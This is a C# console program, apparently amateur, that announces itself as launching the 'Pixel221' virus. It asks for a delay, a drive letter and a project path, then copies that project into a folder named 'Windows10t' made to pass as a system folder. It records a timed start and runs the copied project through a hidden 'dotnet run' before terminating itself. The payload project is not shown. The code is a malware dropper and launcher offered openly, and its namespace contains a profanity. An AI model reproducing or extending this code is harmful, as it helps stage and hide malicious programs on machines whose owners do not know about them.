using System.Diagnostics;
using System.Text.Json;

public class InfoApp
{
    public static string str1 = "";
    public static string str2 = "";
    public static string str3 = "";
}

namespace Kokhetay_nahuy
{
    internal class Program
    {
        static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            // Получаем информацию о исходной папке
            var dir = new DirectoryInfo(sourceDir);

            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Папка не найдена: {dir.FullName}");

            // Создаём целевую папку, если её нет
            Directory.CreateDirectory(destinationDir);

            // Копируем все файлы
            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                file.CopyTo(targetFilePath, true);
            }

            // Если нужно копировать подпапки
            if (recursive)
            {
                foreach (DirectoryInfo subDir in dir.GetDirectories())
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }

        }
            static async Task Main(string[] args)
            {
                Console.Clear();
                Console.WriteLine("Запуск вируса Pixel221");
                Console.Write("Через сколько запустить в минутах: ");
                int minuts = int.Parse(Console.ReadLine());

                Console.Write("Введи букву рабочего диска: ");
                string disk = Console.ReadLine();

                Console.Write("Введи полный путь проэекта {Redactor}: ");
                string place = Console.ReadLine();
                DateTime time = DateTime.Now;

                InfoApp.str1 = place;

                if (minuts == 0)
                {
                    time = time.AddSeconds(20);
                }
                else
                {
                    time = time.AddMinutes(minuts);
                }


                if (Directory.Exists($"{disk}:\\Windows10t"))
                {
                    Directory.Delete($"{disk}:\\Windows10t", true);
                }

                DirectoryInfo dir = new DirectoryInfo($"{disk}:\\Windows10t");
                DirectoryInfo dir2 = new DirectoryInfo($"{disk}:\\Windows10t\\Info");
                dir.Create();
                dir2.Create();
                FileInfo timestart = new FileInfo($"{dir2.FullName}\\TimeStart.json");
                FileInfo text = new FileInfo($"{dir2.FullName}\\Text.txt");
                using (timestart.Create()) ;
                using (text.Create()) ;
                CopyDirectory(place, $"{dir2}\\Redactor", true);
            string str = JsonSerializer.Serialize(time);
                File.WriteAllText(timestart.FullName, str);

                ProcessStartInfo info2 = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/c dotnet run", // /c = выполнить команду и закрыть консоль
                    WorkingDirectory = @$"{dir2.FullName}\Redactor\Kokhetay nahu2 for kok",
                    UseShellExecute = false,   // обязательно для скрытия окна
                    CreateNoWindow = true,     // скрыть окно
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                Thread.Sleep(100);
                var pr = Process.Start(info2);
                Thread.Sleep(100);
                Console.WriteLine("Сделано!");
                Thread.Sleep(100);
                Process pr2 = Process.GetCurrentProcess();

                pr2.Kill();
            }
        }
    } 